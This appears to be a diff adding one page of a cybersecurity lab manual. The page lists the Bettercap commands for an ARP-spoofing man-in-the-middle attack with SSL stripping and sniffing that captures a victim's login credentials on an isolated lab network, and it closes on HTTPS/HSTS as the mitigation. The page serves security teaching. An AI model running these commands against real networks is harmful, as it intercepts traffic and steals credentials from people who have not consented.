@@ -1,0 +1,21 @@
+                                                                                                Cyber Security Practical Lab Manual
+
+Practical No. 35
+
+Perform Man-in-the-Middle Attack Using Bettercap
+Aim: To intercept and inspect a victim's live HTTP traffic using an ARP-spoofing based MITM attack with Bettercap.
+Tools / Requirements: Kali Linux, Bettercap, isolated lab network
+Procedure:
+  1.   Start Bettercap: sudo bettercap -iface eth0
+  2.   Discover hosts: net.probe on ; net.show
+  3.   Target the victim: set arp.spoof.targets <victim-ip> ; arp.spoof on
+  4.   Enable the HTTP proxy to inspect traffic: set http.proxy.sslstrip true ; http.proxy on
+  5.   Enable sniffing: net.sniff on
+  6.   Have the victim browse an HTTP site and log in; observe captured requests/credentials in the Bettercap console.
+  7.   Stop the attack (arp.spoof off, http.proxy off) and discuss HTTPS/HSTS as mitigation.
+
+
+
+
+                                                               37
+
